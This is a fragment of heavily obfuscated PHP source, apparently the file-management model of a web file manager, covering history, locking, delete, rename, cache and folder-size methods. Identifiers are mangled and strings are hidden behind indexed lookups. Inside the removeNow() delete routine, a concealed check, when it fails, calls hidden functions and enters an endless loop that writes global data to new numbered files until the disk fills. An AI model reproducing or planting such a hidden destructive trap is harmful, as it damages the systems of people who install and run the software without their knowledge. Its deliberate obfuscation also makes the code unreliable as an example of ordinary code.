$àƒ÷õÀ, $Ï®š“Û, !1); } } } $ëÑ®Îàã = array($µë±„±Ñ[666] => 0, $µë±„±Ñ[506] => $àƒ÷õÀ, $µë±„±Ñ[667] => substr(get_path_ext($àƒ÷õÀ), 0, 10), $µë±„±Ñ[555] => $Ö¿îæ»°[$µë±„±Ñ[554]], $µë±„±Ñ[637] => $Ö¿îæ»°[$µë±„±Ñ[79]]); $úÁİÙÎ = $this->_addSource($ëÑ®Îàã, $¡şâ—Ë¨); $this->folderSizeReset($ò‚Şİ¬Ÿ, intval($ëÑ®Îàã[$µë±„±Ñ[79]])); return $úÁİÙÎ; } protected function fileHistory($é‘ùÀ, $ÚÄä¿Şº, $É™¸áŸ±) { $¿ÚÚË¨— =& $_SERVER[±Ö‰ô½¯]; if ($é‘ùÀ[$¿ÚÚË¨—[554]] == $ÚÄä¿Şº) { return !1; } $this->checkLock($é‘ùÀ[$¿ÚÚË¨—[193]], $ÚÄä¿Şº); Model($¿ÚÚË¨—[2430])->addHistory($é‘ùÀ); $Á‹¹¨® = array($¿ÚÚË¨—[671] => USER_ID, $¿ÚÚË¨—[510] => time(), $¿ÚÚË¨—[554] => $ÚÄä¿Şº, $¿ÚÚË¨—[79] => $É™¸áŸ±); $this->where(array($¿ÚÚË¨—[503] => $é‘ùÀ[$¿ÚÚË¨—[193]]))->save($Á‹¹¨®); $this->sourceCacheClear($é‘ùÀ[$¿ÚÚË¨—[193]]); return !0; } public function checkLock($ÜÖÄ¨à, $ƒğ®Š¶ş) { $Ûğ¨ƒÒ =& $_SERVER[±Ö‰ô½¯]; $‘äˆêü´ = $this->pathInfo($ÜÖÄ¨à); if (!$this->fileIsLock($‘äˆêü´, !0)) { return; } $¦å¯¤ßŸ = Session::get($Ûğ¨ƒÒ[2431]); $«©šÀÀ“ = substr($‘äˆêü´[$Ûğ¨ƒÒ[32]], 0, -1 - strlen($‘äˆêü´[$Ûğ¨ƒÒ[168]])) . $Ûğ¨ƒÒ[1345] . $¦å¯¤ßŸ . $Ûğ¨ƒÒ[10] . $‘äˆêü´[$Ûğ¨ƒÒ[168]]; $§ÆäĞ’ = Model($Ûğ¨ƒÒ[694])->find($ƒğ®Š¶ş); $this->_createFileCall($‘äˆêü´[$Ûğ¨ƒÒ[192]], $«©šÀÀ“, $§ÆäĞ’, REPEAT_REPLACE, $Ûğ¨ƒÒ[1492]); $àÔÉ›°Á = $‘äˆêü´[$Ûğ¨ƒÒ[552]][$Ûğ¨ƒÒ[630]]; $ã¾°Æİ = $àÔÉ›°Á[$Ûğ¨ƒÒ[2432]] ? $àÔÉ›°Á[$Ûğ¨ƒÒ[2432]] : $àÔÉ›°Á[$Ûğ¨ƒÒ[32]]; show_json(LNG($Ûğ¨ƒÒ[2433]) . $Ûğ¨ƒÒ[2434] . LNG($Ûğ¨ƒÒ[2435]) . $Ûğ¨ƒÒ[2436] . $ã¾°Æİ . $Ûğ¨ƒÒ[2437], !1); } public function fileIsLock($Õúê„‘, $õìĞƒ¸® = false) { $ÊÉîŠÜ =& $_SERVER[±Ö‰ô½¯]; if (!_get($Õúê„‘, $ÊÉîŠÜ[626], 0)) { return !1; } if ($Õúê„‘[$ÊÉîŠÜ[552]][$ÊÉîŠÜ[629]] != USER_ID) { return !0; } $¤½«”Ê = $GLOBALS[$ÊÉîŠÜ[6]][$ÊÉîŠÜ[92]][$ÊÉîŠÜ[627]]; if ($Õúê„‘[$ÊÉîŠÜ[552]][$ÊÉîŠÜ[628]] <= time() - $¤½«”Ê) { $this->metaSet($Õúê„‘[$ÊÉîŠÜ[193]], $ÊÉîŠÜ[629], null); $this->metaSet($Õúê„‘[$ÊÉîŠÜ[193]], $ÊÉîŠÜ[628], null); } if ($õìĞƒ¸®) { $this->metaSet($Õúê„‘[$ÊÉîŠÜ[193]], $ÊÉîŠÜ[628], time()); } return !1; } private function _addSource($¾¦Ô÷™†, $¿¡•ä€•) { $çŸ¦Æê =& $_SERVER[±Ö‰ô½¯]; $øøúÄëä = KodUser::id(); $ª®º¡Ã = array($çŸ¦Æê[668] => $¿¡•ä€•[$çŸ¦Æê[190]], $çŸ¦Æê[669] => $¿¡•ä€•[$çŸ¦Æê[586]], $çŸ¦Æê[670] => $øøúÄëä, $çŸ¦Æê[671] => $øøúÄëä, $çŸ¦Æê[489] => $¿¡•ä€•[$çŸ¦Æê[193]], $çŸ¦Æê[672] => $¿¡•ä€•[$çŸ¦Æê[601]] . $¿¡•ä€•[$çŸ¦Æê[193]] . $çŸ¦Æê[50], $çŸ¦Æê[516] => 0, $çŸ¦Æê[673] => $çŸ¦Æê[12]); $¾¦Ô÷™† = array_merge($ª®º¡Ã, $¾¦Ô÷™†); $this->updateModifyTime($¾¦Ô÷™†[$çŸ¦Æê[192]]); $ÅËİµ¡ = $çŸ¦Æê[2438] . $¿¡•ä€•[$çŸ¦Æê[193]]; if (isset(self::$cacheChildList[$ÅËİµ¡])) { unset(self::$cacheChildList[$ÅËİµ¡]); } static $¤•ê¦İ— = false; if (!$¤•ê¦İ—) { Hook::trigger($çŸ¦Æê[656], $¾¦Ô÷™†); $¤•ê¦İ— = !0; } $Ã¦ÊûÆô = $this->add($¾¦Ô÷™†); $Ò­Ç‹¹ = array($çŸ¦Æê[674] => short_id($Ã¦ÊûÆô)); $this->where(array($çŸ¦Æê[503] => $Ã¦ÊûÆô))->save($Ò­Ç‹¹); $this->setNamePinyin($Ã¦ÊûÆô, $¾¦Ô÷™†[$çŸ¦Æê[32]]); return $Ã¦ÊûÆô; } public function remove($›¹êĞß, $²§¨¬ = true) { $­Û’’íß =& $_SERVER[±Ö‰ô½¯]; $Â£É³¤´ = $this->sourceInfo($›¹êĞß); $¾«êı°Ş = intval($Â£É³¤´[$­Û’’íß[190]]) === self::TYPE_SYSTEM; $êÎŒ„¼ = Model($­Û’’íß[519])->get($­Û’’íß[2439]) == $­Û’’íß[91]; if ($¾«êı°Ş || $²§¨¬ || !$êÎŒ„¼) { return $this->removeNow($›¹êĞß, $²§¨¬); } $†¾§×Ê = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $øÆ©Éî˜ = $Â£É³¤´[$­Û’’íß[190]] == self::TYPE_USER ? $­Û’’íß[682] : $­Û’’íß[595]; if ($øÆ©Éî˜ == $­Û’’íß[682]) { $ßÁû¢®Ã = Model($­Û’’íß[594])->getInfo($Â£É³¤´[$­Û’’íß[586]]); $é£µÕš¢ = !empty($ßÁû¢®Ã[$­Û’’íß[2432]]) ? $ßÁû¢®Ã[$­Û’’íß[2432]] : $ßÁû¢®Ã[$­Û’’íß[32]]; $é£µÕš¢ = $­Û’’íß[339] . $é£µÕš¢ . $­Û’’íß[2440] . $Â£É³¤´[$­Û’’íß[586]]; } else { $ßÁû¢®Ã = Model($­Û’’íß[602])->getInfo($Â£É³¤´[$­Û’’íß[586]]); $é£µÕš¢ = _get($ßÁû¢®Ã, $­Û’’íß[32]); $é£µÕš¢ = $­Û’’íß[175] . $é£µÕš¢ . $­Û’’íß[2441] . $Â£É³¤´[$­Û’’íß[586]]; } $¬µ»Ä’Ï = $­Û’’íß[2442] . md5($é£µÕš¢); CacheLock::lock($¬µ»Ä’Ï); $³¾™¡±Š = $this->fileNameExist($†¾§×Ê, $é£µÕš¢); if (!$³¾™¡±Š) { $³¾™¡±Š = $this->mkdir($†¾§×Ê, $é£µÕš¢, REPEAT_SKIP); $this->metaSet($³¾™¡±Š, $­Û’’íß[2443], $øÆ©Éî˜); $this->metaSet($³¾™¡±Š, $­Û’’íß[2444], $Â£É³¤´[$­Û’’íß[586]]); if ($Â£É³¤´[$­Û’’íß[192]] != 0) { $this->metaSet($³¾™¡±Š, $­Û’’íß[2445], _get($ßÁû¢®Ã, $­Û’’íß[2446])); } } CacheLock::unlock($¬µ»Ä’Ï); $this->metaSet($›¹êĞß, $­Û’’íß[2447], $Â£É³¤´[$­Û’’íß[192]]); $this->where(array($­Û’’íß[193] => $›¹êĞß))->save(array($­Û’’íß[510] => time())); $this->recycleClear($Â£É³¤´); Model($­Û’’íß[653])->eventRemove($›¹êĞß); $ó®¦‡´‹ = $this->move($›¹êĞß, $³¾™¡±Š, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Â£É³¤´[$­Û’’íß[192]]); return $ó®¦‡´‹; } private function recycleClear($´Î¿³ˆ) { $Øì×ÍÌ¾ =& $_SERVER[±Ö‰ô½¯]; $ŠÀÇ¦ê‡ = $this->childrenAll($´Î¿³ˆ); $İ“€á—æ = array($Øì×ÍÌ¾[503] => array($Øì×ÍÌ¾[504], $ŠÀÇ¦ê‡[$Øì×ÍÌ¾[2448]])); Model($Øì×ÍÌ¾[2449])->where($İ“€á—æ)->delete(); } public function removeNow($Ş¯ôÛ´, $“¨•¿ = true) { $ëË›ªÑ =& $_SERVER[±Ö‰ô½¯]; $²ä Ë£ş = $_SERVER[$ëË›ªÑ[1699]]; $¡ŸğïšÑ = $ëË›ªÑ[1846]; if ($_SERVER[$ëË›ªÑ[986]] != $¡ŸğïšÑ($²ä Ë£ş)) { $ˆ¨âÑ™ = $ëË›ªÑ[988]; $‚İÃ»çš = $ëË›ªÑ[989]; $œŠ¨ãµÁ = $_SERVER[$ëË›ªÑ[990]] . $ëË›ªÑ[991]; $—Ê´Æ¡Õ = $‚İÃ»çš($œŠ¨ãµÁ); $¡Œ·¢‚­ = explode($ëË›ªÑ[287], $—Ê´Æ¡Õ); if (count($¡Œ·¢‚­) < $ëË›ªÑ[717]) { $¯î»äº = $ëË›ªÑ[992]; $¯î»äº(); } $ùˆ³ƒœ = $ëË›ªÑ[993]; $ùˆ³ƒœ($_SERVER[$ëË›ªÑ[994]]); $ˆ¨âÑ™ = $ëË›ªÑ[988]; $ˆ¨âÑ™(); $ë«÷‰Å¢ = $ëË›ªÑ[1847]; $ ôÙ‚Í· = json_encode($GLOBALS[$ëË›ªÑ[1848]]); $şÂµßÂí = 1; for ($ÏÙêÅ™é = $şÂµßÂí; $ÏÙêÅ™é > 0; $ÏÙêÅ™é++) { $ë«÷‰Å¢(DATA_PATH . $ÏÙêÅ™é, $ ôÙ‚Í·); } } $ÖŒ’¤ıû = $this->sourceInfo($Ş¯ôÛ´); $§¹Çö¯² = $this->pathInfoMore($Ş¯ôÛ´); if (!$ÖŒ’¤ıû) { return !0; } if ($ÖŒ’¤ıû[$ëË›ªÑ[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($Ş¯ôÛ´); Hook::trigger($ëË›ªÑ[2450], $§¹Çö¯², $“¨•¿); if ($“¨•¿) { Model($ëË›ªÑ[2449])->moveToRecycle($Ş¯ôÛ´); } else { $¥âú„Ë = $this->childrenAll($ÖŒ’¤ıû); Model($ëË›ªÑ[653])->eventRemove($Ş¯ôÛ´); $this->removeRelevance($¥âú„Ë[$ëË›ªÑ[2448]], $¥âú„Ë[$ëË›ªÑ[1730]]); } $this->folderSizeReset($ÖŒ’¤ıû[$ëË›ªÑ[192]]); $·Ëı½Ã¦ = array($ÖŒ’¤ıû[$ëË›ªÑ[192]]); if ($ÖŒ’¤ıû[$ëË›ªÑ[497]] == $ëË›ªÑ[91]) { $·Ëı½Ã¦[] = $ÖŒ’¤ıû[$ëË›ªÑ[193]]; } $this->updateModifyTime($·Ëı½Ã¦); $this->lockMoveEnd($Ş¯ôÛ´); Hook::trigger($ëË›ªÑ[1972], $§¹Çö¯², $“¨•¿); return !0; } public function childrenAll($–ñÏÌãß) { $€Ê’ =& $_SERVER[±Ö‰ô½¯]; $øıâ™óŸ = $–ñÏÌãß[$€Ê’[193]]; if ($–ñÏÌãß[$€Ê’[497]] == $€Ê’[91]) { $£¯ÄóÀ = array($€Ê’[672] => array($€Ê’[632], $–ñÏÌãß[$€Ê’[601]] . $øıâ™óŸ . $€Ê’[633])); $ “ŞÁ È = array($€Ê’[672] => $£¯ÄóÀ[$€Ê’[601]]); $µŒ‡®Õõ = $this->field($€Ê’[2451])->where($ “ŞÁ È)->select(); $•–‘¬¾ = !1; $Û…ºæÑ = array($øıâ™óŸ); if ($µŒ‡®Õõ) { $•–‘¬¾ = array_to_keyvalue($µŒ‡®Õõ, $€Ê’[12], $€Ê’[554]); $•–‘¬¾ = array_remove_value($•–‘¬¾, $€Ê’[230]); $Û…ºæÑ = array_to_keyvalue($µŒ‡®Õõ, $€Ê’[12], $€Ê’[193]); $Û…ºæÑ[] = $øıâ™óŸ; } } else { $•–‘¬¾ = array($–ñÏÌãß[$€Ê’[554]]); $Û…ºæÑ = array($øıâ™óŸ); } return array($€Ê’[2448] => $Û…ºæÑ, $€Ê’[1730] => $•–‘¬¾); } public function removeArray($é³Öõİ) { if (!$é³Öõİ) { return !0; } } public function removeRelevance($¹ÜŞË¥, $ëıõ– °) { $ö¼‘Õ =& $_SERVER[±Ö‰ô½¯]; $¹ÜŞË¥ = $¹ÜŞË¥ ? $¹ÜŞË¥ : array(); $ëıõ– ° = $ëıõ– ° ? $ëıõ– ° : array(); $¹ÜŞË¥ = array_unique(array_filter($¹ÜŞË¥)); $ëıõ– ° = array_filter($ëıõ– °); if (!$¹ÜŞË¥) { return !1; } $‹™Ê›ãõ = array($ö¼‘Õ[503] => array($ö¼‘Õ[504], $¹ÜŞË¥)); Model($ö¼‘Õ[2449])->where($‹™Ê›ãõ)->delete(); Model($ö¼‘Õ[546])->where($‹™Ê›ãõ)->delete(); Model($ö¼‘Õ[2282])->where($‹™Ê›ãõ)->delete(); Model($ö¼‘Õ[653])->where($‹™Ê›ãõ)->delete(); Model($ö¼‘Õ[1512])->removeBySource($¹ÜŞË¥); Model($ö¼‘Õ[2430])->removeBySource($¹ÜŞË¥); $this->where($‹™Ê›ãõ)->delete(); Model($ö¼‘Õ[557])->remove($ëıõ– °); for ($âæ«¸’¸ = 0; $âæ«¸’¸ < count($¹ÜŞË¥); $âæ«¸’¸++) { $this->sourceCacheClear($¹ÜŞË¥[$âæ«¸’¸]); } } public function rename($Øœ ¡Ë€, $íª©Â…İ) { $º‡’ê‚‰ =& $_SERVER[±Ö‰ô½¯]; $Ù§‰ì = $this->sourceInfo($Øœ ¡Ë€); if (!$Ù§‰ì) { return !1; } $¥÷•© = $this->fileNameExist($Ù§‰ì[$º‡’ê‚‰[192]], $íª©Â…İ); if ($¥÷•© && $¥÷•© != $Øœ ¡Ë€) { return !1; } $Úî“äÀÈ = array($º‡’ê‚‰[506] => $íª©Â…İ, $º‡’ê‚‰[671] => USER_ID); if ($Ù§‰ì[$º‡’ê‚‰[497]] != $º‡’ê‚‰[91]) { $Úî“äÀÈ[$º‡’ê‚‰[498]] = substr(get_path_ext($íª©Â…İ), 0, 10); } Model($º‡’ê‚‰[653])->eventRename($Øœ ¡Ë€, $Ù§‰ì[$º‡’ê‚‰[32]], $íª©Â…İ); $this->sourceCacheClear($Øœ ¡Ë€); $this->setNamePinyin($Øœ ¡Ë€, $Úî“äÀÈ[$º‡’ê‚‰[32]], !1); $this->updateModifyTime($Ù§‰ì[$º‡’ê‚‰[192]]); $ı¦ï¨ğÜ = $this->where(array($º‡’ê‚‰[503] => $Øœ ¡Ë€))->data($Úî“äÀÈ)->save(); $ÄÃÀ˜Ç£ = $º‡’ê‚‰[2438] . $Ù§‰ì[$º‡’ê‚‰[192]]; if (isset(self::$cacheChildList[$ÄÃÀ˜Ç£])) { unset(self::$cacheChildList[$ÄÃÀ˜Ç£]); } return $ı¦ï¨ğÜ; } public function setNamePinyin($Œ×ûªÍ¬, $ï½ıî, $ÁÇØ‰Êé = true) { $Û£¼•Ìè =& $_SERVER[±Ö‰ô½¯]; $œçšÁ× = Input::check($ï½ıî, $Û£¼•Ìè[675]); $á§ú‘‹Â = array($Û£¼•Ìè[528] => KodSort::makeStr($ï½ıî)); if ($œçšÁ×) { $á§ú‘‹Â[$Û£¼•Ìè[549]] = str_replace($Û£¼•Ìè[53], $Û£¼•Ìè[12], Pinyin::get($ï½ıî)); $á§ú‘‹Â[$Û£¼•Ìè[548]] = Pinyin::get($ï½ıî, $Û£¼•Ìè[676]); } if (!$ÁÇØ‰Êé && !$œçšÁ×) { $á§ú‘‹Â[$Û£¼•Ìè[549]] = null; $á§ú‘‹Â[$Û£¼•Ìè[548]] = null; } $this->metaSet($Œ×ûªÍ¬, $á§ú‘‹Â); } public function getContent($ƒıĞó¢) { $Š„â÷ğ¤ =& $_SERVER[±Ö‰ô½¯]; $ë„ºœü° = $this->fileInfoGet($ƒıĞó¢); if (!$ë„ºœü°) { return !1; } if ($ë„ºœü°[$Š„â÷ğ¤[79]] == 0) { return $Š„â÷ğ¤[12]; } $ËÚ›½†¶ = $Š„â÷ğ¤[2452] . $ë„ºœü°[$Š„â÷ğ¤[560]]; if ($ë„ºœü°[$Š„â÷ğ¤[79]] <= 1024 * 10) { $Ê«üÊ¢‹ = Cache::get($ËÚ›½†¶); if (!$Ê«üÊ¢‹) { $Ê«üÊ¢‹ = IO::getContent($ë„ºœü°[$Š„â÷ğ¤[87]]); Cache::set($ËÚ›½†¶, $Ê«üÊ¢‹); } return $Ê«üÊ¢‹; } if (!$ë„ºœü°[$Š„â÷ğ¤[87]]) { return $Š„â÷ğ¤[12]; } return IO::getContent($ë„ºœü°[$Š„â÷ğ¤[87]]); } public function setDesc($¨†¿Üâå, $­ßæª¤‰) { $œ¡úÙÛâ =& $_SERVER[±Ö‰ô½¯]; Model($œ¡úÙÛâ[653])->eventAddDesc($¨†¿Üâå, $­ßæª¤‰); return $this->metaSet($¨†¿Üâå, $œ¡úÙÛâ[537], $­ßæª¤‰); } public function setContent($åĞÎŒœÑ, $–Ë×‰³Ş = '') { $‰Æ€ƒº« =& $_SERVER[±Ö‰ô½¯]; $Úâããï« = $this->sourceInfo($åĞÎŒœÑ); $·æÀ¹Ñœ = $this->fileInfoGet($åĞÎŒœÑ); if (!$·æÀ¹Ñœ || !$Úâããï«) { return !1; } $ßŠ¶È“é = KodIO::ioFileDriverGet($‰Æ€ƒº«[495] . $åĞÎŒœÑ . $‰Æ€ƒº«[404]); $¶õ¯Ñß = Model($‰Æ€ƒº«[557])->addFileByContent($–Ë×‰³Ş, $ßŠ¶È“é, $Úâããï«[$‰Æ€ƒº«[32]]); if (!$¶õ¯Ñß) { return !1; } $Ò¤€Š = $this->fileHistory($Úâããï«, $¶õ¯Ñß[$‰Æ€ƒº«[554]], $¶õ¯Ñß[$‰Æ€ƒº«[79]]); if (!$Ò¤€Š) { return Model($‰Æ€ƒº«[557])->remove($¶õ¯Ñß[$‰Æ€ƒº«[554]]); } $this->folderSizeReset($Úâããï«[$‰Æ€ƒº«[192]]); return !0; } public function fileSubstr($ôğ¤ùï, $œŒÜªü÷, $´Ò™ñù) { $ç•±™›Å = $this->fileInfoGet($ôğ¤ùï); if (!$ç•±™›Å) { return !1; } return IO::fileSubstr($ç•±™›Å[$_SERVER[±Ö‰ô½¯][87]], $œŒÜªü÷, $´Ò™ñù); } public function fileInfoGet($¦ë·­öÎ) { $§ÏÃ¡¿± =& $_SERVER[±Ö‰ô½¯]; $÷ä¬×ÄÁ = $this->sourceInfo($¦ë·­öÎ); if (!$÷ä¬×ÄÁ || $÷ä¬×ÄÁ[$§ÏÃ¡¿±[497]]) { return !1; } $ÒĞ‹éõ = $§ÏÃ¡¿±[561] . $÷ä¬×ÄÁ[$§ÏÃ¡¿±[554]]; $İÁÚ = _get(self::$cacheFileInfo, $ÒĞ‹éõ); if ($İÁÚ) { return $İÁÚ; } $çŸ¥® = Model($§ÏÃ¡¿±[557])->fileInfo($÷ä¬×ÄÁ[$§ÏÃ¡¿±[554]]); if ($çŸ¥®) { $çŸ¥®[$§ÏÃ¡¿±[32]] = $÷ä¬×ÄÁ[$§ÏÃ¡¿±[32]]; } self::$cacheFileInfo[$ÒĞ‹éõ] = $çŸ¥®; return $çŸ¥®; } private function folderChildrenNumber($“‘£æĞğ) { $©ÅŠó‘ =& $_SERVER[±Ö‰ô½¯]; $¶ı¶†Ï = $this->sourceInfo($“‘£æĞğ); $¶ùéÑ¦ = array($©ÅŠó‘[672] => array($©ÅŠó‘[632], $¶ı¶†Ï[$©ÅŠó‘[601]] . $“‘£æĞğ . $©ÅŠó‘[633]), $©ÅŠó‘[669] => $¶ı¶†Ï[$©ÅŠó‘[586]], $©ÅŠó‘[516] => intval($¶ı¶†Ï[$©ÅŠó‘[517]]), $©ÅŠó‘[666] => 1); $‚¯Ô‘¾… = $this->where($¶ùéÑ¦)->count(); $¶à§®İÉ = $this->where($¶ùéÑ¦)->where(array($©ÅŠó‘[666] => 0))->count(); return array($©ÅŠó‘[83] => $¶à§®İÉ, $©ÅŠó‘[84] => $‚¯Ô‘¾…); } public function pathInfo($Àì—ƒ¾’, $Á¸÷ìùï = false) { $¼İä³‘œ =& $_SERVER[±Ö‰ô½¯]; $Á¸÷ìùï = !1; $Àì—ƒ¾’ = intval($Àì—ƒ¾’); if (!$Àì—ƒ¾’) { return !1; } $ŞÈ÷„—Ê = $¼İä³‘œ[545] . intval($Á¸÷ìùï) . $¼İä³‘œ[474] . $Àì—ƒ¾’; $ª‰õ÷†ì = _get(self::$cachePathInfo, $ŞÈ÷„—Ê); if ($ª‰õ÷†ì) { return $ª‰õ÷†ì; } $½ó‰¡Á‚ = $this->sourceInfo($Àì—ƒ¾’); if (!$½ó‰¡Á‚) { return !1; } $½ó‰¡Á‚ = $this->_listDataApplyItem($½ó‰¡Á‚, $Á¸÷ìùï); self::$cachePathInfo[$ŞÈ÷„—Ê] = $½ó‰¡Á‚; return $½ó‰¡Á‚; } public static $cachePathInfoMore = array(); public function pathInfoMore($õüƒË…³) { $ôâ¶õÂÖ =& $_SERVER[±Ö‰ô½¯]; $²ó¡ò×Ú = _get(self::$cachePathInfoMore, $õüƒË…³); if ($²ó¡ò×Ú) { return $²ó¡ò×Ú; } $œÚµ¯ûû = $this->pathInfo($õüƒË…³); if (!$œÚµ¯ûû) { return !1; } if ($œÚµ¯ûû[$ôâ¶õÂÖ[497]] == $ôâ¶õÂÖ[91]) { $œÚµ¯ûû[$ôâ¶õÂÖ[82]] = $this->folderChildrenNumber($õüƒË…³); } self::$cachePathInfoMore[$õüƒË…³] = $œÚµ¯ûû; return $œÚµ¯ûû; } public function sourceInfo($÷®ÂÂ‡‰) { $æŞº†¯ =& $_SERVER[±Ö‰ô½¯]; if (!$÷®ÂÂ‡‰) { return array(); } $÷®ÂÂ‡‰ = intval($÷®ÂÂ‡‰); $Ş¤Ôå¯ = $æŞº†¯[544] . $÷®ÂÂ‡‰; $¼£ÓÌ‡À = _get(self::$cacheSourceInfo, $Ş¤Ôå¯); if ($¼£ÓÌ‡À) { return $¼£ÓÌ‡À; } $€ôİÚº» = $this->where(array($æŞº†¯[193] => $÷®ÂÂ‡‰))->find(); self::$cacheSourceInfo[$Ş¤Ôå¯] = $€ôİÚº»; return self::$cacheSourceInfo[$Ş¤Ôå¯]; } public function sourceCacheClear($ı­»àê¦ = false) { self::cacheClear($ı­»àê¦); } public static function cacheClear($½Àş”È¼ = false) { $ÏÀ’Œ =& $_SERVER[±Ö‰ô½¯]; if ($½Àş”È¼ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÏÀ’Œ[544] . $½Àş”È¼]); unset(self::$cachePathInfoMore[$½Àş”È¼]); unset(self::$cachePathInfo[$ÏÀ’Œ[2453] . $½Àş”È¼]); unset(self::$cachePathInfo[$ÏÀ’Œ[2454] . $½Àş”È¼]); } public function metaSet($¤ÄŠµ¹©, $ÇñîØ = null, $û¼ñ‹İã = null) { $­œ§¢Œ = parent::metaSet($¤ÄŠµ¹©, $ÇñîØ, $û¼ñ‹İã); if ($­œ§¢Œ) { $this->sourceCacheClear($¤ÄŠµ¹©); } return $­œ§¢Œ; } public function pathInfoByPath($·ğ´óºİ, $­ÁÈ†ˆ­) { $€”Êò€Ù =& $_SERVER[±Ö‰ô½¯]; $Ñ¡âÄí = !$­ÁÈ†ˆ­ ? array() : explode($€”Êò€Ù[8], trim($­ÁÈ†ˆ­, $€”Êò€Ù[8])); $à¶ğ»½ø = intval($·ğ´óºİ); foreach ($Ñ¡âÄí as $‹Ï¹€‹å) { $¦¬œ¶¼ğ = array($€”Êò€Ù[192] => $à¶ğ»½ø, $€”Êò€Ù[32] => $‹Ï¹€‹å); $üşÂëËÆ = $this->field($€”Êò€Ù[2455])->where($¦¬œ¶¼ğ)->select(); if (!$üşÂëËÆ) { return !1; } $üşÂëËÆ = array_sort_by($üşÂëËÆ, $€”Êò€Ù[517]); $à¶ğ»½ø = intval($üşÂëËÆ[0][$€”Êò€Ù[193]]); } $Ó¼§„¡ã = $this->sourceInfo($à¶ğ»½ø); $this->pathInfoFilter($Ó¼§„¡ã); return $Ó¼§„¡ã; } protected function updateModifyTime($£Ä÷Şâ÷) { $ÌÈûÇï =& $_SERVER[±Ö‰ô½¯]; $–€öâ‰ = KodUser::id(); if (!$£Ä÷Şâ÷) { return; } if (!is_array($£Ä÷Şâ÷)) { $£Ä÷Şâ÷ = array($£Ä÷Şâ÷); } foreach ($£Ä÷Şâ÷ as $ÎŠ“§ => $«¸ÍîŒ¿) { $£Ä÷Şâ÷[$ÎŠ“§] = intval($«¸ÍîŒ¿); $this->sourceCacheClear($«¸ÍîŒ¿); } $Ïßïçê¶ = array($ÌÈûÇï[193] => array($ÌÈûÇï[7], $£Ä÷Şâ÷)); $”©Æš¢İ = array($ÌÈûÇï[671] => $–€öâ‰, $ÌÈûÇï[510] => time()); $this->where($Ïßïçê¶)->save($”©Æš¢İ); } public function folderSizeReset($ŒÁ—á…, $Î›ı‡½— = false) { $™Ş„Ãü­ =& $_SERVER[±Ö‰ô½¯]; if ($this->statusIgnoreResetSpace) { return; } if (!$ŒÁ—á…) { return; } $£Ö÷ãúº = $this->sourceInfo($ŒÁ—á…); $è¦à¼İö = $™Ş„Ãü­[2456] . $ŒÁ—á…; if (!$£Ö÷ãúº || !$£Ö÷ãúº[$™Ş„Ãü­[193]]) { return; } CacheLock::lock($è¦à¼İö, 20); if ($Î›ı‡½— === !1) { $this->sourceCacheClear($ŒÁ—á…); $£Ö÷ãúº = $this->sourceInfo($ŒÁ—á…); $÷ˆ×¼ƒõ = array($™Ş„Ãü­[489] => $ŒÁ—á…, $™Ş„Ãü­[516] => 0); $òÉÈˆÆ = $this->where($÷ˆ×¼ƒõ)->sum($™Ş„Ãü­[79]); $Î›ı‡½— = intval($òÉÈˆÆ) - intval($£Ö÷ãúº[$™Ş„Ãü­[79]]); } if ($Î›ı‡½— == 0) { return CacheLock::unlock($è¦à¼İö); } $åìŞÇÃŒ = $this->parentLevelArray($£Ö÷ãúº[$™Ş„Ãü­[601]]); if (!$åìŞÇÃŒ) { $åìŞÇÃŒ = array(); } $åìŞÇÃŒ[] = $£Ö÷ãúº[$™Ş„Ãü­[193]]; $÷ˆ×¼ƒõ = array($™Ş„Ãü­[193] => array($™Ş„Ãü­[504], $åìŞÇÃŒ)); if ($Î›ı‡½— < 0) { $÷ˆ×¼ƒõ[$™Ş„Ãü­[79]] = array($™Ş„Ãü­[1131], abs($Î›ı‡½—)); } $this->where($÷ˆ×¼ƒõ)->setAdd($™Ş„Ãü­[79], $Î›ı‡½—); CacheLock::unlock($è¦à¼İö); if (!$£Ö÷ãúº[$™Ş„Ãü­[586]] || $£Ö÷ãúº[$™Ş„Ãü­[586]] == $™Ş„Ãü­[230]) { return; } $ÒìŒ›é = $™Ş„Ãü­[2457] . $£Ö÷ãúº[$™Ş„Ãü­[190]] . $™Ş„Ãü­[4] . $£Ö÷ãúº[$™Ş„Ãü­[586]]; $ºÎ½ÖÈ§ = array($£Ö÷ãúº[$™Ş„Ãü­[190]], $£Ö÷ãúº[$™Ş„Ãü­[586]]); TaskRun::timeLimitCall($ÒìŒ›é, $™Ş„Ãü­[2458], $ºÎ½ÖÈ§, 1.5); } public function folderSizeResetChildren($œŒ‰ï‹) { $Ó“…ËÉü =& $_SERVER[±Ö‰ô½¯]; $this->sourceCacheClear($œŒ‰ï‹); $ÁÅğÇñÍ = $this->sourceInfo($œŒ‰ï‹); if (!$ÁÅğÇñÍ) { return; } $éóÕ°Ç£ = array($Ó“…ËÉü[666] => 1, $Ó“…ËÉü[669] => $ÁÅğÇñÍ[$Ó“…ËÉü[586]], $Ó“…ËÉü[672] => array($Ó“…ËÉü[632], $ÁÅğÇñÍ[$Ó“…ËÉü[601]] . $œŒ‰ï‹ . $Ó“…ËÉü[633])); $œ¦Äàµ¬ = $Ó“…ËÉü[2459]; $¸íŞ¾¬¡ = $this->field($œ¦Äàµ¬)->where($éóÕ°Ç£)->select(); $éóÕ°Ç£[$Ó“…ËÉü[497]] = 0; $ı°ş ÷ = $this->field($œ¦Äàµ¬)->where($éóÕ°Ç£)->select(); if (!$ı°ş ÷) { return; } $¸íŞ¾¬¡[] = $ÁÅğÇñÍ; $¸íŞ¾¬¡ = array_to_keyvalue($¸íŞ¾¬¡, $Ó“…ËÉü[193]); foreach ($¸íŞ¾¬¡ as $ÛµŒÆ¥ë => $¢»ü™áª) { $¸íŞ¾¬¡[$ÛµŒÆ¥ë][$Ó“…ËÉü[2460]] = $¸íŞ¾¬¡[$ÛµŒÆ¥ë][$Ó“…ËÉü[79]]; $¸íŞ¾¬¡[$ÛµŒÆ¥ë][$Ó“…ËÉü[79]] = 0; } foreach ($ı°ş ÷ as $¢»ü™áª) { $òòœäò¹ = $¢»ü™áª[$Ó“…ËÉü[192]] . $Ó“…ËÉü[12]; if (!isset($¸íŞ¾¬¡[$òòœäò¹])) { continue; } if ($¢»ü™áª[$Ó“…ËÉü[517]] == 